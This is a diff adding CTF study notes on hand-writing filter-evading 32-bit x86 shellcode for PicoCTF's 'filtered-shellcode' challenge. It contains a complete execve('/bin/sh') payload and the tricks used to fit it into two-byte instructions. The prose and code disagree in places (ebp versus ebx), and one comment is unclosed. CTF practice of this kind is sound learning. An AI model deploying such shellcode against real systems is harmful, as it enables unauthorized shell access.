@@ -1,0 +1,119 @@
+* asm tips for writing shellcode
+
+  {https://defuse.ca/online-x86-assembler.htm#disassembly}[very useful assembler]
+
+** (ref. PicoCTF/filtered-shellcode)
+
+   *32-bit*
+
+   In this challenge, your shellcode would be run under a filter: it would be broken up into byte pairs, inserting 2 nops
+   every 2 bytes of shellcode. This means that conventional shellcodes wouldn't work, as they contain instructions longer
+   than 2 bytes. Hence, we need to write our own shellcode. 
+
+   The broad idea is just to execute a syscall with the following registers: 
+
+   `eax=11, ebx=<pointer to /bin/sh>, ecx=0, edx=0`
+
+   The first trick we have is `xor`. `xor ecx, ecx` will zero out the register in a single instruction which happens to
+   be 2 bytes long. We want to do this for all our registers.
+
+   The second trick is `ah/al`. `eax` is a 32-bit register like so:
+
+   @code 
+   00 -------------> eax
+   00 -------------> eax
+   00 -> ah -> ax -> eax
+   00 -> al -> ax -> eax
+   @end
+
+   Using `ah/al`, we are able to modify part of `eax` byte by byte. (`ax` just refers to the lower 2 bytes of `eax`, or
+   `ah/al` combined.)
+
+   This is useful as `mov al, 11` is 2 bytes long, while `mov eax, 11` is 5 bytes long.
+
+   The third trick is `shl ebx`. `ebx` is the most complicated register to control. Not only do we need to write the
+   string to a location in memory and put the address in `ebx`, we also can't do it easily, since we can only write the
+   bottom 2 bytes of each register. However, `shl ebx` will left-shift the contents of the register (or multiply by 2),
+   so if we shift 8 times the contents of the register would be 1 byte shifted. 
+
+   @code
+   00 00 68 73 -> before
+   00 68 73 00 -> after left-shifting 8 times
+   @end
+
+   Hence, we can use `ebx` to push `/sh\0` followed by `/bin` to the stack. 
+
+   Lastly, `esp` points to the top of the stack. Since we just pushed `/bin` and `/sh\0` to the stack, `/bin/sh\0` would be
+   at the top, and the address `esp` stores resolves to `/bin/sh`. We can simply `mov ebp, esp` to setup `ebp` for the
+   syscall.
+
+   Here is the full assembly:
+   @code asm
+   /* Zero out the register 8?
+   xor eax, eax
+   xor ebx, ebx
+   xor ecx, ecx
+   xor edx, edx
+
+   /* eax = 11 */
+   mov al, 11
+
+   /* ebx = "sh\0" */
+   mov bl, 0x68
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   mov bl, 0x2f
+   mov bh, 0x73
+   push ebx
+   nop
+
+   /* ebx = "/bin" */
+   mov bl, 0x69
+   mov bh, 0x6e
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   shl ebx
+   mov bl, 0x2f
+   mov bh, 0x62
+   push ebx
+   nop
+
+   /* ebx = <pointer to /bin/sh> */
+   mov ebx, esp
+
+   int 0x80
+   @end
+
+*** Some notes:
+
+    I tried just "sh\0" to shorten the payload, and it turns out `execve("sh", 0, 0)` isn't valid, probably because there's no env loaded in
+    execve.
+
+    Using `syscall` in this 32-bit challenge will result in SIGILL.
